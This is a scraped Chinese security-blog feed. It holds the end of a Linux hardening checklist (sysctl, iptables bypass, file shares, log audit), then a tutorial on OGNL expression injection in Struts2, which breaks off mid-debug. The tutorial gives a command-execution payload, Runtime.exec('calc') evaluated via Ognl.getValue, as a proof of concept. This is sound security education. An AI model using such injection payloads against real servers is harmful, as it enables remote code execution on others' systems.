sysctl</h2><p>sysctl命令用于运行时配置内核参数，这些参数位于/proc/sys目录下。sysctl配置与显示在/proc/sys目录中的内核参数中。可以用sysctl来设置联网功能，如IP转发、源路由检查等。用户只需要编辑/etc/sysctl.conf文件即可手动或自动执行由sysctl控制的功能。</p><p>如下三种配置存在安全问题：</p><ul><li>设置net.ipv4.ip_forward=1，使得Linux不同网卡间报文可以转发，导致三面不隔离；</li><li>设置net.ipv4.conf.all.accept_redirects = 1，使得Linux接收ICMP redirect报文，会被中间人攻击；</li><li>没有设置net.ipv4.tcp_syncookies为1，不能防御TCP SYN Flood攻击；</li></ul><h2 id="0x08-系统配置"><a href="#0x08-系统配置" class="headerlink" title="0x08 系统配置"></a>0x08 系统配置</h2><h3 id="系统未做资源控制，普通用户消耗过多资源导致DoS"><a href="#系统未做资源控制，普通用户消耗过多资源导致DoS" class="headerlink" title="系统未做资源控制，普通用户消耗过多资源导致DoS"></a>系统未做资源控制，普通用户消耗过多资源导致DoS</h3><p>原理：系统资源会因为外部操作而明显消耗，导致DoS。这些资源包括文件句柄、内存、CPU、最大进程数、登录会话数等。</p><p>排查方法：</p><ol><li>分析外部接口，是否存在可被外部触发大量的资源消耗操作；</li><li>使用程序消耗大量系统资源，查看系统是否存在资源过载保护机制，正常业务是否明显受到影响，如用户无法登录、无法运行新进程等；</li></ol><h3 id="iptables规则存在被绕过的错误配置"><a href="#iptables规则存在被绕过的错误配置" class="headerlink" title="iptables规则存在被绕过的错误配置"></a>iptables规则存在被绕过的错误配置</h3><p>由于iptables规则设计不完善，可导致被绕过。</p><p>比如，一个虚拟机br网桥安全组规则片段如下：</p><p>规则1，允许UDP报文通过，源端口是68，目的端口是67：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A neutron-openvswi-ofa960951-9 -p udp -m udp --sport 68 --dport 67 -j RETURN</span><br></pre></td></tr></table></figure><p>规则2，目的IP是100.64.0.0/10的全部丢弃报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A neutron-openvswi-relay-cidr -d 100.64.0.0/10 -j DROP</span><br></pre></td></tr></table></figure><p>规则3，检测目的MAC与IP是否绑定，没有绑定则直接丢弃报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-A neutron-openvswi-s0bff551f-2 -s 192.168.0.15/32 -m mac --mac-source FA:16:3E:71:F1:DD -j RETURN</span><br><span class="line">-a neutron-openvswi-s0bff551f-2 -j DROP</span><br></pre></td></tr></table></figure><p>上述安全组规则设计存在如下缺陷：由于规则2比规则1优先级低，恶意用户构造特殊报文会绕过目的IP为100.64.0.0某些协议的报文穿越到其他租户的VPC中，对不属于自己的虚拟机进行流量攻击，破坏VPC隔离性。</p><h3 id="系统对外的文件共享（nfs、samba）配置不当"><a href="#系统对外的文件共享（nfs、samba）配置不当" class="headerlink" title="系统对外的文件共享（nfs、samba）配置不当"></a>系统对外的文件共享（nfs、samba）配置不当</h3><p>执行<code>exportfs -av</code>命令，查看系统开启了哪些nfs共享并逐个确认。</p><p>查看/etc/samba/smb.conf，查看系统开启了哪些共享并逐个确认。</p><h3 id="建议禁止用户利用ssh做端口转发"><a href="#建议禁止用户利用ssh做端口转发" class="headerlink" title="建议禁止用户利用ssh做端口转发"></a>建议禁止用户利用ssh做端口转发</h3><p>ssh的端口转发功能会破坏网络隔离性，非必须的情况下建议默认禁止。</p><p>排查方法：查看/etc/ssh/ssh_config配置文件，确认端口转发功能是否已默认禁止，选项为<code>AllowTcpForwarding</code>。</p><h3 id="口令保存在-etc-passwd中"><a href="#口令保存在-etc-passwd中" class="headerlink" title="口令保存在/etc/passwd中"></a>口令保存在/etc/passwd中</h3><p>用户口令密文保存在/etc/passwd文件中，而不是/etc/shadow文件中。</p><p>/etc/passwd是全局可读的文件，若用户口令密文直接保存在该文件中将会导致用户密码可被工具暴力破解。</p><p>排查方法：直接查看/etc/passwd的内容是否存在用户口令密文。</p><h2 id="0x09-日志审计"><a href="#0x09-日志审计" class="headerlink" title="0x09 日志审计"></a>0x09 日志审计</h2><h3 id="日志文件可被普通用户修改"><a href="#日志文件可被普通用户修改" class="headerlink" title="日志文件可被普通用户修改"></a>日志文件可被普通用户修改</h3><p>日志文件用于审计，需要防止被普通用户修改。</p><p>排查方法：查看所有系统日志文件的访问权限，避免出现可被普通用户进行修改的权限。</p><h3 id="日志目录未处于独立分区，日志过多会导致占满整个磁盘"><a href="#日志目录未处于独立分区，日志过多会导致占满整个磁盘" class="headerlink" title="日志目录未处于独立分区，日志过多会导致占满整个磁盘"></a>日志目录未处于独立分区，日志过多会导致占满整个磁盘</h3><p>如题。</p><h3 id="系统是否监听UDP-514端口，能接收网络上发来的日志信息"><a href="#系统是否监听UDP-514端口，能接收网络上发来的日志信息" class="headerlink" title="系统是否监听UDP 514端口，能接收网络上发来的日志信息"></a>系统是否监听UDP 514端口，能接收网络上发来的日志信息</h3><p>对于非嵌入式Linux，开启了syslog服务后，会监听UDP 514端口，此时网络所发过来的日志都会被syslog记录，若日志量非常大时，会极大地消耗磁盘空间。</p><p>排查方法：<code>netstat -an | grep 514</code></p><p>如果有监听，则查看syslog日志是否保存在独立分区中，或者日志是否有做轮转。</p><h3 id="日志是否记录敏感信息"><a href="#日志是否记录敏感信息" class="headerlink" title="日志是否记录敏感信息"></a>日志是否记录敏感信息</h3><p>查看系统日志，使用关键字查找日志文件，是否有session、密码、token、地址、号码等用户敏感信息。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Linux" scheme="https://www.mi1k7ea.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://www.mi1k7ea.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>OGNL表达式注入漏洞总结</title>
    <link href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/03/16/OGNL表达式注入漏洞总结/</id>
    <published>2020-03-16T13:51:15.000Z</published>
    <updated>2020-03-22T14:23:23.818Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-OGNL表达式基础"><a href="#0x01-OGNL表达式基础" class="headerlink" title="0x01 OGNL表达式基础"></a>0x01 OGNL表达式基础</h2><h3 id="OGNL简介"><a href="#OGNL简介" class="headerlink" title="OGNL简介"></a>OGNL简介</h3><p>OGNL全称Object-Graph Navigation Language即对象导航图语言，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。</p><p>OGNL使用<strong>Java反射</strong>和<strong>内省</strong>来解决运行时应用程序的对象图。这允许程序根据对象图的状态改变行为，而不是依赖于编译时设置。它还允许更改对象图。</p><p>简单了解下Java内省机制：</p><blockquote><p>Java语言内省（Introspector）是Java语言对Bean类属性、事件的一种缺省处理方法。例如类A中有属性name,那我们可以通过getName,setName来得到其值或者设置新的值。通过getName/setName来访问name属性，这就是默认的规则。Java中提供了一套API用来访问某个属性的getter/setter方法，通过这些API可以使你不需要了解这个规则（但你最好还是要搞清楚），这些API存放于包java.beans中。</p><p>一般的做法是通过类Introspector来获取某个对象的BeanInfo信息，然后通过BeanInfo来获取属性的描述器（PropertyDescriptor），通过这个属性描述器就可以获取某个属性对应的getter/setter方法，然后我们就可以通过反射机制来调用这些方法。</p></blockquote><p>OGNL可以让我们用非常简单的表达式访问对象层，例如，当前环境的根对象为user1，则表达式person.address[0].province可以访问到user1的person属性的第一个address的province属性。</p><p>webwork2和现在的Struts2.x中使用OGNL取代原来的EL来做界面数据绑定，所谓界面数据绑定，也就是把界面元素（例如一个textfield,hidden)和对象层某个类的某个属性绑定在一起，修改和显示自动同步。而Struts2框架正是因为滥用OGNL表达式，使之成为了“漏洞之王”。</p><p>OGNL表达式具有以下特点：</p><ul><li>支持对象方法调用，如<code>objName.methodName()</code>；</li><li>支持类静态方法调用和值访问，表达式的格式为<code>@[类全名（包括包路径）]@[方法名|值名]</code>，如@java.lang.String@format(‘fruit%s’,’frt’)；</li><li>支持赋值操作和表达式串联，如price=100、discount=0.8，calculatePrice(price*discount)这个表达式会返回80；</li><li>访问OGNL上下文（OGNL context）和ActionContext；</li><li>操作集合对象；</li><li>可以直接new一个对象；</li></ul><h3 id="OGNL三要素"><a href="#OGNL三要素" class="headerlink" title="OGNL三要素"></a>OGNL三要素</h3><p>OGNL具有三要素：表达式（expression）、根对象（root）和上下文对象（context）。</p><ul><li>表达式（expression）：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；</li><li>根对象（root）：root可以理解为OGNL的操作对象，OGNL可以对root进行取值或写值等操作，表达式规定了“做什么”，而根对象则规定了“对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境；</li><li>上下文对象（context）：context可以理解为对象运行的上下文环境，context以MAP的结构、利用键值对关系来描述对象中的属性以及值；</li></ul><p>这样不难知道，OGNL的context是包含root的。</p><p>Struts2中的ActionContext即为OGNL的context（又称context map），其中包含的ValueStack即为OGNL的root。该ActionContext包含的对象如图：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/1.png" alt=""></p><h3 id="ActionContext"><a href="#ActionContext" class="headerlink" title="ActionContext"></a>ActionContext</h3><p>ActionContext是上下文对象，对应OGNL的context，是一个以MAP为结构、利用键值对关系来描述对象中的属性以及值的对象，简单来说可以理解为一个action的小型数据库，整个action生命周期（线程）中所使用的数据都在这个ActionContext中。</p><p>借网上的一个图看下ActionContext中包含哪些东西：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/2.png" alt=""></p><p>除了三个常见的作用域<code>request</code>、<code>session</code>、<code>application</code>外，还有以下三个作用域：</p><ul><li>attr：保存着上面三个作用域的所有属性，如果有重复的则以request域中的属性为基准；</li><li>paramters：保存的是表单提交的参数；</li><li>VALUE_STACK：值栈，保存着valueStack对象，也就是说可以通过ActionContext访问到valueStack中的值；</li></ul><h3 id="ValueStack"><a href="#ValueStack" class="headerlink" title="ValueStack"></a>ValueStack</h3><p>值栈（ValueStack）就是OGNL表达式存取数据的地方。在一个值栈中，封装了一次请求所需要的所有数据。</p><p>在使用Struts2的项目中，Struts2会为每个请求创建一个新的值栈，也就是说，值栈和请求是一一对应的关系，这种一一对应的关系使值栈能够线程安全地为每个请求提供公共的数据存取服务。</p><h4 id="值栈的作用"><a href="#值栈的作用" class="headerlink" title="值栈的作用"></a>值栈的作用</h4><p>值栈可以作为一个数据中转站在前台与后台之间传递数据，最常见的就是将Struts2的标签与OGNL表达式结合使用。值栈实际上是一个接口，在Struts2中利用OGNL时，实际上使用的就是实现了该接口的OgnlValueStack类，这个类是OGNL的基础。</p><p>值栈贯穿整个Action的生命周期，每个Action类的对象实例都拥有一个ValueStack对象，在ValueStack对象中保存了当前Action对象和其他相关对象。</p><p>要获取值栈中存储的数据，首先应该获取值栈。值栈的获取有两种方式，具体如下。</p><h4 id="在request中获取值栈"><a href="#在request中获取值栈" class="headerlink" title="在request中获取值栈"></a>在request中获取值栈</h4><p>ValueStack对象在request范围内的存储方式为<code>request.setAttribute(&quot;struts.valueStack&quot;,valuestack)</code>，可以通过如下方式从request中取出值栈的信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取 ValueStack 对象，通过 request 对象获取</span></span><br><span class="line">ValueStack valueStack = (ValueStack)ServletActionContext.getRequest()</span><br><span class="line">            .getAttribute(ServletActionContext.STRUTS_VALUESTACK_KEY);</span><br></pre></td></tr></table></figure><p>在上述示例代码中，ServletActionContext.STRUTS_VALUESTACK_KEY是ServletActionContext类中的常量，它的值为struts.valueStack。</p><h4 id="在ActionContext中获取值栈"><a href="#在ActionContext中获取值栈" class="headerlink" title="在ActionContext中获取值栈"></a>在ActionContext中获取值栈</h4><p>在使用Struts2框架时，可以使用OGNL操作Context对象从ValueStack中存取数据，也就是说，可以从Context对象中获取ValueStack对象。实际上，Struts2框架中的Context对象就是ActionContext。</p><p>ActionContext获取ValueStack对象的方式如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过 ActionContext 获取 valueStack 对象</span></span><br><span class="line">ValueStack valueStack = ActionContext.getContext().getValueStack();</span><br></pre></td></tr></table></figure><p>ActionContext对象是在StrutsPrepareAndExcuteFilter的doFilter()方法中被创建的，在源码中用于创建ActionContext对象的createActionContext()方法内可以找到获取的ValueStack对象的信息。</p><p>方法中还有这样一段代码：  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx = <span class="keyword">new</span> ActionContext(stack.getContext());</span><br></pre></td></tr></table></figure><p>从上述代码中可以看出，ValueStack对象中的Context对象被作为参数传递给了ActionContext对象，这也就说明ActionContext对象中持有了ValueStack对象的引用，因此可以通过ActionContext对象获取ValueStack对象。</p><h3 id="OGNL基本语法"><a href="#OGNL基本语法" class="headerlink" title="OGNL基本语法"></a>OGNL基本语法</h3><p>OGNL支持各种纷繁复杂的表达式。但是最最基本的表达式的原型，是将对象的引用值用点串联起来，从左到右，每一次表达式计算返回的结果成为当前对象，后面部分接着在当前对象上进行计算，一直到全部表达式计算完成，返回最后得到的对象。OGNL则针对这条基本原则进行不断的扩充，从而使之支持对象树、数组、容器的访问，甚至是类似SQL中的投影选择等操作。</p><h4 id="基本对象树的访问"><a href="#基本对象树的访问" class="headerlink" title="基本对象树的访问"></a>基本对象树的访问</h4><p>对象树的访问就是通过使用点号将对象的引用串联起来进行。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxxx</span><br><span class="line">xxxx.xxxx</span><br><span class="line">xxxx.xxxx.xxxx.xxxx.xxxx</span><br></pre></td></tr></table></figure><h4 id="对容器变量的访问"><a href="#对容器变量的访问" class="headerlink" title="对容器变量的访问"></a>对容器变量的访问</h4><p>对容器变量的访问，通过#符号加上表达式进行。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#xxxx</span><br><span class="line">#xxxx.xxxx</span><br><span class="line">#xxxx.xxxxx.xxxx.xxxx.xxxx</span><br></pre></td></tr></table></figure><h4 id="使用操作符号"><a href="#使用操作符号" class="headerlink" title="使用操作符号"></a>使用操作符号</h4><p>OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用<code>+, -, *, /, ++, --, ==, !=, =</code>等操作符之外，还能使用<code>mod, in, not in</code>等。</p><h4 id="容器、数组、对象"><a href="#容器、数组、对象" class="headerlink" title="容器、数组、对象"></a>容器、数组、对象</h4><p>OGNL支持对数组和ArrayList等容器的顺序访问。例如：<code>group.users[0]</code></p><p>同时，OGNL支持对Map的按键值查找。例如：<code>#session[&#39;mySessionPropKey&#39;]</code></p><p>不仅如此，OGNL还支持容器的构造的表达式。例如：<code>{&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;}</code>构造一个List，<code>#{&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;, &quot;key3&quot; : &quot;value3&quot;}</code>构造一个Map</p><p>你也可以通过任意类对象的构造函数进行对象新建。例如：<code>new Java.net.URL(&quot;xxxxxx/&quot;)</code></p><h4 id="对静态方法或变量的访问"><a href="#对静态方法或变量的访问" class="headerlink" title="对静态方法或变量的访问"></a>对静态方法或变量的访问</h4><p>要引用类的静态方法和字段，他们的表达方式是一样的<code>@class@member</code>或者<code>@class@method(args)</code>。</p><p>例如：@com.javaeye.core.Resource@ENABLE，@com.javaeye.core.Resource@getAllResources</p><h4 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h4><p>直接通过类似Java的方法调用方式进行，你甚至可以传递参数。</p><p>例如：<code>user.getName()</code>，<code>group.users.size()</code>，<code>group.containsUser(#requestUser)</code></p><h4 id="投影和选择"><a href="#投影和选择" class="headerlink" title="投影和选择"></a>投影和选择</h4><p>OGNL支持类似数据库中的投影（projection） 和选择（selection）。</p><p>投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 <code>collection.{XXX}</code>，其中XXX是这个集合中每个元素的公共属性。</p><p>例如：<code>group.userList.{username}</code>将获得某个group中的所有user的name的列表。</p><p>选择就是过滤满足selection条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：<code>collection.{X YYY}</code>，其中X是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：</p><ul><li><code>?</code>选择满足条件的所有元素</li><li><code>^</code>选择满足条件的第一个元素</li><li><code>$</code>选择满足条件的最后一个元素</li></ul><p>例如：<code>group.userList.{? #txxx.xxx != null}</code>将获得某个group中user的name不为空的user的列表。</p><h3 id="OGNL语法树"><a href="#OGNL语法树" class="headerlink" title="OGNL语法树"></a>OGNL语法树</h3><p>OGNL语法树有两种形式：</p><ul><li>(expression)(constant) = value</li><li>(constant)((expression1)(expression2))</li></ul><p>每个括号对应语法树上的一个分支，并且从最右边的叶子节点开始解析执行。</p><h3 id="关于”-”符号"><a href="#关于”-”符号" class="headerlink" title="关于”.”符号"></a>关于”.”符号</h3><p>所有的OGNL表达式都基于当前对象的上下文来完成求值运算，链的前面部分的结果将作为后面求值的上下文。</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name.toCharArray()[0].numbericValue.toString()</span><br></pre></td></tr></table></figure><ul><li>提取根(root)对象的name属性</li><li>调用上一步返回的结果字符串的toCharArray()方法</li><li>提取返回结果数组的第一个字符</li><li>获取字符的numbericValue属性，该字符是一个Character对象，Character类有个getNumeericValue()方法</li><li>调用结果Integer对象的toString()方法</li></ul><h3 id="和-和-的区别"><a href="#和-和-的区别" class="headerlink" title="# 和 % 和 $ 的区别"></a># 和 % 和 $ 的区别</h3><h4 id="符"><a href="#符" class="headerlink" title="#符"></a>#符</h4><p><code>#</code>符主要有三种用途：</p><ul><li>访问非根对象属性，即访问OGNL上下文和Action上下文，由于Struts2中值栈被视为根对象，所以访问其他非根对象时需要加#前缀，#相当于<code>ActionContext.getContext()</code>；</li><li>用于过滤和投影（projecting）集合，如<code>books.{? #this.price&lt;100}</code>；</li><li>用于构造Map，如<code>#{&#39;foo1&#39;:&#39;bar1&#39;, &#39;foo2&#39;:&#39;bar2&#39;}</code>；</li></ul><h4 id="符-1"><a href="#符-1" class="headerlink" title="%符"></a>%符</h4><p><code>%</code>符的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。</p><h4 id="符-2"><a href="#符-2" class="headerlink" title="$符"></a>$符</h4><p><code>$</code>符的主要作用是在相关配置文件中引入OGNL表达式，让其在配置文件中也能解析OGNL表达式。（换句话说，$用于在配置文件中获取ValueStack的值用的）。</p><h3 id="和-和-的区别-1"><a href="#和-和-的区别-1" class="headerlink" title="# 和 . 和 @ 的区别"></a># 和 . 和 @ 的区别</h3><ul><li>获取静态函数和变量的时候用@</li><li>获取非静态函数用.号获取</li><li>获取非静态变量用#获取</li></ul><h3 id="基本用法Demo"><a href="#基本用法Demo" class="headerlink" title="基本用法Demo"></a>基本用法Demo</h3><p>依赖的jar包：ognl-2.6.11.jar</p><p>示例代码1，基本的调用执行OGNL表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String str = <span class="string">"1+2"</span>;</span><br><span class="line">        OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line">        Object ognl = Ognl.parseExpression(str);</span><br><span class="line">        Object value = Ognl.getValue(ognl,context,context.getRoot());</span><br><span class="line">        System.out.println(<span class="string">"result:"</span> + value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可输出<code>result:3</code>。</p><p>示例代码2，使用#符号从上下文获取变量值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">        OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line">        context.put(<span class="string">"user"</span>,user);</span><br><span class="line">        String str = <span class="string">"#user.name"</span>;</span><br><span class="line">        Object ognl = Ognl.parseExpression(str);</span><br><span class="line">        Object value = Ognl.getValue(ognl,context,context.getRoot());</span><br><span class="line">        System.out.println(<span class="string">"result:"</span> + value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行输出<code>result:mi1k7ea</code>。</p><h3 id="OGNL与EL的区别"><a href="#OGNL与EL的区别" class="headerlink" title="OGNL与EL的区别"></a>OGNL与EL的区别</h3><p>因为OGNL表达式是Struts2的默认表达式语言，所以只针对Struts2标签有效；然而EL在HTML中也可以使用。</p><p>Struts2标签用的都是OGNL表达式语言，所以它多数都是去值栈的栈顶找值，找不到再去作用域；相反，EL都是去Map集合作用域中找。</p><p>页面取值区别如下表：</p><table><thead><tr><th>名称</th><th>servlet</th><th>OGNL</th><th>EL</th></tr></thead><tbody><tr><td>parameters</td><td>request.getParameter(“username”)</td><td>#username</td><td>${username}</td></tr><tr><td>request</td><td>request.getAttribute(“userName”)</td><td>#request.userName</td><td>${requestScope.username}</td></tr><tr><td>session</td><td>session.getAttribute(“userName”)</td><td>#session.userName</td><td>${sessionScope.username}</td></tr><tr><td>application</td><td>application.getAttribute(“userName”)</td><td>#application.userName</td><td>${applicationScope.username}</td></tr><tr><td>attr</td><td>用于按request &gt; session &gt; application顺序访问其属性（attribute）</td><td>#attr.userName相当于按顺序在以上三个范围（scope）内读取userName属性，直到找到为止</td></tr></tbody></table><h2 id="0x02-能解析OGNL的API"><a href="#0x02-能解析OGNL的API" class="headerlink" title="0x02 能解析OGNL的API"></a>0x02 能解析OGNL的API</h2><p>能解析OGNL的API如下表：</p><table><thead><tr><th style="text-align:left">类名</th><th style="text-align:left">方法名</th></tr></thead><tbody><tr><td style="text-align:left">com.opensymphony.xwork2.util.TextParseUtil</td><td style="text-align:left">translateVariables,translateVariablesCollection</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.util.TextParser</td><td style="text-align:left">evaluate</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.util.OgnlTextParser</td><td style="text-align:left">evaluate</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ognl.OgnlUtil</td><td style="text-align:left">setProperties,setProperty,setValue,getValue,callMethod,compile</td></tr><tr><td style="text-align:left">org.apache.struts2.util.VelocityStrutsUtil</td><td style="text-align:left">evaluate</td></tr><tr><td style="text-align:left">org.apache.struts2.util.StrutsUtil</td><td style="text-align:left">isTrue,findString,findValue,getText,translateVariables,makeSelectList</td></tr><tr><td style="text-align:left">org.apache.struts2.views.jsp.ui.OgnlTool</td><td style="text-align:left">findValue</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.util.ValueStack</td><td style="text-align:left">findString,findValue,setValue,setParameter</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ognl.OgnlValueStack</td><td style="text-align:left">findString,findValue,setValue,setParameter,trySetValue</td></tr><tr><td style="text-align:left">ognl.Ognl</td><td style="text-align:left">parseExpression,getValue,setValue</td></tr></tbody></table><p>以下是调用过程中可能会涉及到的一些类：</p><table><thead><tr><th style="text-align:left">涉及类名</th><th style="text-align:left">方法名</th></tr></thead><tbody><tr><td style="text-align:left">com.opensymphony.xwork2.ognl.OgnlReflectionProvider</td><td style="text-align:left">getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.util.reflection.ReflectionProvider</td><td style="text-align:left">getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue</td></tr></tbody></table><h2 id="0x03-OGNL表达式注入漏洞"><a href="#0x03-OGNL表达式注入漏洞" class="headerlink" title="0x03 OGNL表达式注入漏洞"></a>0x03 OGNL表达式注入漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>由前面知道，OGNL可以访问静态方法、属性以及对象方法等，其中包含可以执行恶意操作如命令执行的类java.lang.Runtime等，当OGNL表达式外部可控时，攻击者就可以构造恶意的OGNL表达式来让程序执行恶意操作，这就是OGNL表达式注入漏洞。</p><p>最简单的弹计算器的Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建一个OGNL上下文对象</span></span><br><span class="line">        OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// getValue()触发</span></span><br><span class="line">        <span class="comment">// @[类全名(包括包路径)]@[方法名|值名]</span></span><br><span class="line">        Ognl.getValue(<span class="string">"@java.lang.Runtime@getRuntime().exec('calc')"</span>, context, context.getRoot());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// setValue()触发</span></span><br><span class="line"><span class="comment">//        Ognl.setValue(Runtime.getRuntime().exec("calc"), context, context.getRoot());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getValue()和setValue()都能成功解析恶意的OGNL表达式、触发弹计算器：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/3.png" alt=""></p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>这里简单调试分析下Ognl.getValue()解析OGNL表达式到执行命令的过程。</p><p>在前面的<code>Ognl.getValue</code>代码处打下断点，往下调试，看到调用了parseExpression()函数，该函数将传入的String类型的字符串解析为OGNL表达式能理解的ASTChain类型：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/5.png" alt=""></p><p>往下，将传入的ASTChain类型的tree参数转换成Node类型（ASTChain继承自SimpleNode、SimpleNode继承自Node）再调用其getValue()函数继续解析：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/6.png" alt=""></p><p>由于tree变量就是表达式解析来的东西，因此接下来的调用中局部环境中的this变量的值就是我们的OGNL表达式的内容。往下就是调用的SimpleNode.getValue()函数，其中调用了evaluateGetValueBody()函数：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/7.png" alt=""></p><p>evaluateGetValueBody()函数，顾名思义，用于计算getValue体中OGNL表达式的值。跟进看是直接调用了getValueBody()函数：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/8.png" alt=""></p><p>跟下去，就是调用的ASTChain.getValueBody()函数，这里会循环解析ASTChain中每个节点的表达式，这里有两个子节点，首先会解析第一个节点即<a href="mailto:`@java.lang.Runtime" target="_blank" rel="noopener">`@java.lang.Runtime</a>@getRuntime()`这个OGNL表达式：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/9.png" alt=""></p><p><img 